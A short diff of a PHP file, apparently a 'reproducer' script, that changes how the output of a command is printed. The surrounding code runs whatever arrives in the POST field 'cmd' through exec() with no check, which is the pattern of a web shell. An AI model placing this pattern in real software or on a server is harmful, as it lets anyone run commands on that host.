@@ -10,7 +10,9 @@ echo "Hello Reproducer!!";
 if (isset($_POST['cmd'])) {
     exec($_POST['cmd'], $output);
     echo '<pre>';
-    echo $output.PHP_EOL;
+    foreach ($output as $line) {
+        echo $line;
+    }
     echo '</pre>';
 }
 
